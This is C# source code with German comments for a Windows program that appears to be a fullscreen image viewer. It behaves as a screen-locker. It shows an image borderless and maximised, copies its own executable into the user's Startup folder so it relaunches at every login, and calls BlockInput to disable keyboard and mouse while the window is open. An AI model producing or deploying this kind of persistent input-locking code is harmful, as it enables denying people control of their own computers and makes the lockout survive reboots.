using System;
using System.Drawing; // Für Image-Unterstützung
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace FullscreenApp {
    public partial class Form1 : Form {
        // Importiert BlockInput, um die Tastatur und Maus zu sperren
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool fBlockIt);

        public Form1() {
            InitializeComponent(); // Vom Designer generiert
            ShowImageInFullscreen(); // Methode für Vollbild und Bildanzeige
            CopyToStartup(); // Methode zum Kopieren in den Autostart-Ordner
        }

        private void ShowImageInFullscreen() {
            // Fenster maximieren und Bild anzeigen
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.BackgroundImage = Image.FromFile("D:\\Overlay\\FulscreenApp\\3296364.jpg"); // Pfad zum Bild anpassen
            this.BackgroundImageLayout = ImageLayout.Stretch;
        }

        private void CopyToStartup() {
            // Pfad zur ausführbaren Datei ermitteln
            string exePath = Application.ExecutablePath;
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string targetPath = Path.Combine(startupFolder, Path.GetFileName(exePath));

            // Kopiert die Datei in den Autostart-Ordner, wenn sie noch nicht existiert
            if (!File.Exists(targetPath)) {
                File.Copy(exePath, targetPath);
            }
        }

        protected override void OnShown(EventArgs e) {
            base.OnShown(e);
            BlockInput(true); // Eingabegeräte sperren
        }

        protected override void OnFormClosed(FormClosedEventArgs e) {
            BlockInput(false); // Eingabegeräte entsperren
            base.OnFormClosed(e);
        }
    }
}
